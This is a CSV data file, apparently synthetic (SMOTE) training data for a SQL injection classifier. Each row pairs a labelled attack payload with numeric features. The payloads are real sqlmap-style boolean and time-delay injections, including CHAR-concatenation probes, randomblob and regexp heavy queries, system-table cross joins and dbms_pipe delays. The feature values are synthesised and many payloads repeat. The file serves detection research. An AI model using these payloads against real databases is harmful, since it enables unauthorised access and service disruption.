id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000027,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000024,3.1823724034417955,322.96565070062996,31.723769673397555,3.4262997407743025,85.99141267515749,39.76230326602446,148.44963149342357,48.76230326602446,0.2679271330782721,0.12483684620823149,0.4516669463710841,0.15556907434241224,4.0,0.0,0.0,0.0,0.0,2.638115163301223,0.0,30.762303266024464,0.7237696733975536,0.3618848366987768,1.7237696733975536,11.190575816506117,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.3618848366987768,1.2762303266024464,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6381151633012232,0.0,0.0,0.0,0.0,9.466806143108561,0.0,0.0,0.0,0.0,0.0,0.0,0.6381151633012232,0.6381151633012232,14.657381959614678
SMOTE_000028,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000024,3.3134830380386484,374.4281037559882,35.73482749828908,3.521751711261164,110.57572399726253,41.31820700205311,167.9546210061593,54.579551750513275,0.296969836748634,0.10984006768349176,0.44729056595412564,0.1458995296137486,4.0,0.0,0.0,0.0,0.0,2.0530345003421844,0.0,35.15910350102655,0.0,0.9469654996578156,2.420448249486723,12.053034500342186,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.4734827498289078,1.5265172501710924,0.0,0.0,0.4734827498289079,1.5265172501710922,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5265172501710922,0.0,0.0,0.0,0.0,9.63258625085546,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,15.685620751197646
SMOTE_000029,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.3848367782427515,172.45473680941353,34.0,3.8469768227950647,58.893003103667404,17.187244568582045,66.75411762878991,29.620371508374173,0.3471844021872468,0.09658561324581265,0.3853889139554827,0.17084107061145787,3.5133746120415745,0.0,0.0,0.0,0.0,1.0267492240831495,0.0,14.053498448166298,1.0267492240831495,1.4866253879584252,2.0267492240831495,7.026749224083149,1.0,0.0,0.0,0.0,0.0,0.5133746120415748,1.0,0.0,0.0,0.0,1.0,0.48662538795842525,0.0,0.0,0.48662538795842525,1.0,0.5133746120415748,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.5668730602078735,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.053498448166299
SMOTE_000030,attack,boolean,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000028,1.384891393679213,150.4300246236751,31.701017236572582,3.999448345289328,75.24300246236751,9.944019698940092,45.97200984947005,19.270992612897466,0.5005008774228001,0.06552663010835326,0.30552969336538605,0.1284427991034606,0.0,3.2709926128974653,0.4860049247350231,0.0,1.0,2.0,0.0,6.0,1.513995075264977,0.0,2.0,3.486004924735023,0.0,1.0,0.24300246236751155,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.24300246236751155,1.0,1.7569975376324884,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000031,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,0.6290972948666168,178.8225055473211,33.85864591037946,3.76390925703183,52.03156411796866,22.727813193415138,72.04208549062487,32.021042745312435,0.29094775983328425,0.12715672050014717,0.4032670255565367,0.1786284941100318,4.28270817924108,0.0,0.0,0.1413540896205402,0.0,2.0,0.0,14.86916728303568,2.0,0.8586459103794598,2.71729182075892,7.293229551897299,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.8586459103794599,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.293229551897299,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.293229551897299
SMOTE_000032,attack,boolean,"-8327 where 7555  =  7555 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000013,2.8907815700531274,365.4392282394105,34.25769411470679,3.541683515932412,103.49269646382561,50.50730353617439,159.78768941646914,51.65153882294136,0.28383033541324076,0.13771809194122922,0.43701770744450996,0.1414338652010201,1.3030776458827158,0.0,2.0226917655879633,0.0,0.0,2.348461177058642,0.0,33.34846117705864,0.0,0.6515388229413578,1.9773082344120367,14.371152942646606,0.3257694114706789,0.0,0.6742305885293209,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.32576941147067895,1.674230588529321,0.0,0.6742305885293212,0.325769411470679,0.32576941147067895,0.6742305885293212,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.674230588529321,0.0,0.0,0.0,0.0,10.371152942646605,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,16.71961411970525
SMOTE_000033,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000005,0.107950002739472,253.26574763725645,36.98006606479605,3.812355527547043,75.50165161990128,36.740858842348665,99.26244439745389,41.76079277755261,0.2981494944594616,0.14505336933287633,0.3918148589548342,0.16498227725282785,0.07973574081579571,0.0,1.9601321295921021,0.0,0.0,2.0,0.0,21.800660647960513,0.0,2.0,3.9401981943881537,13.920264259184204,0.01993393520394887,0.0,0.9800660647960511,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.019933935203948816,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.860462453572358,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.880396388776306
SMOTE_000034,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000031,2.6034519549494877,102.77823930845096,30.44455982711274,3.7956403245273953,29.79729709814769,21.753638238319052,37.62820493926833,13.599099032715896,0.2500535363511478,0.2649245169356802,0.35538141743941704,0.12964052927375497,1.7536382383190532,0.0,2.4154539205603154,0.5845460794396844,0.0,2.0,0.0,5.676368635517475,0.0,0.0,0.5845460794396844,5.584546079439685,0.5845460794396844,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.5845460794396843,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.584546079439684
SMOTE_000035,attack,boolean,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000006,0.5079176517741681,241.99095502754233,36.39051782848194,3.7570602190595324,71.25733022816874,28.69525891424097,97.56207131392776,44.47629457120485,0.29393919628812554,0.11898592940920874,0.4034633164067854,0.1836115578958803,4.0,0.0,0.0,0.0,0.0,2.0,0.0,21.39051782848194,2.0,1.8476294571204854,3.8476294571204854,11.39051782848194,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.1523705428795146,0.8476294571204854,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.69525891424097,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.69525891424097
SMOTE_000036,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,0.1931136576698178,194.47711787230912,34.273855893615455,3.7694587511973694,56.734420659564556,24.456426489359092,78.19084714892365,35.095423574461826,0.2915697503597607,0.12602396416466818,0.40206984876757984,0.1803364367079912,4.0,0.0,0.0,0.0,0.0,2.0,0.0,16.547711787230913,2.0,1.0912852978718186,3.091285297871819,8.365141191487275,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.182570595743638,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.182570595743638
SMOTE_000037,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000009,2.546817417239831,158.83267612713487,36.58366193643256,4.2182928302600695,76.83267612713487,16.832676127134878,45.66929549146049,19.498028381404634,0.483713585538966,0.10594303837235572,0.2876957103410264,0.12264766574765187,1.249014190702317,0.583661936432561,2.0,0.0,1.0,2.0,0.0,5.583661936432561,0.0,2.081690317837195,2.832676127134878,5.416338063567439,0.41633806356743897,0.5836619364325609,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.416338063567439,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.416338063567439
SMOTE_000038,attack,boolean,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",nearest_attack_euclidean,R000029,1.4617014707115983,367.5531934117886,31.831363206970792,3.381116147774044,92.0047283032701,53.1780933995694,170.8668254814965,51.503546227452574,0.2544177361243561,0.1428996602106418,0.46069101213275765,0.14199159153224442,0.6650905655766348,0.0,0.8337273586058412,0.0,0.0,2.8337273586058416,0.0,35.339637737693465,0.0,0.3325452827883175,1.4988179241824764,13.667454717211683,0.16627264139415876,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.16627264139415876,1.6674547172116823,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8337273586058412,0.0,0.0,0.0,0.0,11.168636793029204,0.0,0.0,0.0,0.0,0.0,0.0,0.8337273586058412,0.8337273586058412,17.33727358605841
SMOTE_000039,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000021,1.3307659119194937,72.49614785128131,27.324914563433442,3.9154282676454044,21.60702080490492,16.239297919509507,24.085616643923935,10.564212482942951,0.2949743763057884,0.23000626389306306,0.33188304291206355,0.14313631688908496,0.0,3.282106241471476,1.2392979195095082,0.0,0.0,1.239297919509508,0.0,3.2821062414714763,0.0,0.7607020804904919,0.760702080490492,2.4785958390190164,0.0,1.0,0.23929791950950802,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.23929791950950818,0.0,1.0,0.7607020804904919,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000040,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000009,0.8404801061907206,153.17902576094718,35.493445550295995,4.179590653756405,73.8908237704144,16.0,46.5895128804736,16.6986891100592,0.4824899357235465,0.10470385041116265,0.30368028047907003,0.10912593338622087,0.0,1.0,2.0,0.0,1.0,2.0,0.0,5.698689110059199,0.0,0.0,2.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.6986891100591995,0.30131088994080046,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000041,attack,boolean,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000022,2.1554375112949407,117.42245755010455,30.828033018404543,3.782159999040725,44.89163679755001,12.265410376277272,44.04672169734091,16.218688678936363,0.37410580733806587,0.10731911755735951,0.3789786003807393,0.13959647472383527,1.8280330184045448,0.0,2.0,0.6093443394681816,0.39065566053181844,1.0,0.0,7.828033018404544,0.0,0.0,1.3906556605318183,4.0,0.6093443394681816,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.3906556605318184,0.0,0.0,0.3906556605318185,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.781311321063637
SMOTE_000042,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000016,0.8436746377030943,141.85309643452425,33.175228523805934,4.130090662125018,65.62121799405793,17.028324958330195,42.762842785708905,16.440710696427224,0.4624587604222382,0.12008653486816999,0.30153564687619466,0.11591905783339718,0.44071069642722605,0.8530964345242579,2.0,0.14690356547574202,0.853096434524258,2.0,0.0,5.587614261902968,0.0,0.0,1.853096434524258,5.146903565475742,0.14690356547574202,0.8530964345242581,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.853096434524258,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.853096434524258
SMOTE_000043,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000009,1.1099560873189105,149.81073556240162,34.74089256893838,4.119802031463782,72.89372728229027,13.740892568938374,46.74089256893838,16.43522314223459,0.487468992633664,0.09018198689499743,0.31230178507185674,0.11004723539948183,0.0,0.7176115711172968,2.0,0.0,1.0,1.717611571117297,0.0,6.0,0.0,0.0,2.0,4.717611571117297,0.0,0.7176115711172969,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.7176115711172969,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.717611571117297
SMOTE_000044,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,0.9938989701274182,172.7289890780584,35.549620087803966,3.908580964124692,51.90075982439207,24.0,65.92746942927424,30.900759824392072,0.3007416606045884,0.13928269910955526,0.3811063414021288,0.17886929888372755,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.900759824392072,0.45037991219603585,1.774810043901982,1.450379912196036,9.549620087803964,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.774810043901982,0.0,0.774810043901982,0.0,0.22518995609801806,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1259497804900895,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.900759824392072
SMOTE_000045,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,2.790582959656578,164.80979865740477,36.0,4.070881729445177,61.766929531258924,21.60734899305357,54.226946307863095,27.208573825229166,0.3769175755105601,0.13075146811961627,0.32764544882085195,0.16468550754897163,3.6012248321755953,0.0,0.7975503356488095,0.0,0.39877516782440475,2.0,0.0,9.208573825229168,0.0,3.196325503473214,2.196325503473214,8.404899328702381,1.0,0.0,0.3987751678244046,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.6012248321755953,1.3987751678244047,0.0,1.0,0.39877516782440475,0.3987751678244048,0.6012248321755953,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7975503356488094
SMOTE_000046,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000021,1.3281443581962242,93.58121247407354,29.222588749629622,3.9679073191263736,35.35202623111073,14.219290002963023,30.229186242962825,13.780709997036976,0.352001814505273,0.17150079873925322,0.326816095168502,0.14968129158697174,0.0,4.0,0.7774112503703778,0.0,0.22258874962962213,1.222588749629622,0.0,4.445177499259245,0.44517749925924427,0.7774112503703778,1.222588749629622,2.2225887496296224,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.222588749629622,0.0,0.0,0.222588749629622,1.2225887496296222,0.777411250370378,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.445177499259244
SMOTE_000047,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000021,2.917384018405974,106.7107343128709,30.345815670915822,4.05434567889708,44.18723506373736,16.0,32.72907835457912,13.794420894554431,0.38764415957589493,0.16365368824431795,0.3133251191334893,0.13537703304629783,0.0,2.6541843290841762,1.448605223638608,0.0,0.4486052236386079,1.4486052236386078,0.0,4.448605223638609,0.0,0.5513947763613921,1.4486052236386078,3.3458156709158238,0.0,1.0,0.4486052236386079,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.4486052236386078,0.0,0.44860522363860783,0.448605223638608,0.5513947763613922,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.897210447277216
SMOTE_000048,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R000023,1.6606708163360406,86.03353915442379,26.51944744967337,3.862985800690142,32.680382791983256,16.69870350335511,27.340191395991624,9.314261463093803,0.3227792296199247,0.24647393867195933,0.32210665385499554,0.10864017785312041,0.0,1.0,2.0,0.0,0.30129649664489133,2.0,0.0,2.506482483224456,0.0,0.0,0.6025929932897822,4.301296496644891,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.30129649664489117,0.0,1.0,0.3012964966448912,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6025929932897824
SMOTE_000049,attack,boolean,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",nearest_attack_euclidean,R000029,1.3449629919231498,390.3261769655911,31.0,3.2921517391785713,96.93559269032014,54.4120533784976,185.0,53.97853089677338,0.24833248419213907,0.1394175523221836,0.4739632583209761,0.1382867051647012,1.304707862364507,0.0,0.6738230344088733,0.0,0.0,3.0,0.0,38.0,0.0,0.0,1.0,13.673823034408873,0.3261769655911268,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,1.3261769655911269,0.6738230344088733,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_000050,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000004,1.22939214520016,231.19462280311615,36.0,3.8381765802864507,73.5176242172023,27.631874873742305,89.87587406569307,40.169249646478455,0.3166441434531061,0.12169663939108123,0.3874623157432334,0.1741969014125793,4.0,0.0,0.0,0.0,0.0,2.0,0.0,19.26374974748461,0.0,2.0,3.1791249242453836,11.452749949496923,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.2736250252515387,0.0,0.27362502525153876,0.0,0.7263749747484612,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.084624823239229,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.358249848490768
SMOTE_000051,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R000010,0.36322692753237645,34.43085676673812,14.784571616630943,2.9297489982916884,3.0,9.0,16.430856766738117,6.0,0.08723485270881245,0.2617045581264373,0.47659088374712544,0.17446970541762485,1.0,0.0,1.7845716166309429,0.0,0.0,1.0,0.0,2.1077141916845274,0.1077141916845284,0.0,-2.220446049250313e-16,2.7845716166309424,1.0,0.0,0.8922858083154716,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000052,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000026,2.43634725294502,163.44856290899077,33.0,3.7060451278594577,45.88219051160229,21.48119482451034,67.44358447353102,28.64159309934712,0.2826392636500266,0.13079749698256277,0.4121665767239936,0.17439666264341702,4.91980086258161,0.0,0.0,0.45990043129080505,0.0,2.0,0.0,13.40099568709195,2.0,0.540099568709195,2.08019913741839,5.700497843545975,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.540099568709195,0.0,0.0,0.0,0.0,1.540099568709195,0.45990043129080505,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7004978435459743,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.700497843545975
